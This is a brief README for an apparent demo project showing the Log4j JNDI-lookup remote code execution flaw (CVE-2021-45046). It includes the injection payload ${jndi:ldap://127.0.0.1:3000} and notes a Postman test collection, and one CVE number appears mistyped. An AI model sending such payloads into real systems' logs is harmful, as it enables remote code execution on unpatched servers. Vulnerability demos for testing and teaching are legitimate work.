# log4j-vuln-demo
Log4j vulnerability demo
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45046

## CVE: CVE-2021-4428 | CVE-2021-45046
 
- [x] demo apache log4j2 vuln execute RCE via logs
 - [x] ```${jndi:ldap://127.0.0.1:3000}```
 - [x] postman collection for testing
 
## Local Startup

```
  ./gradlew bootRun
```

## Run postman collection local
- [x] log4j-vuln-jndi -> it will fire jndi lookup, 
    ``` try to fetch data from internal resource input```
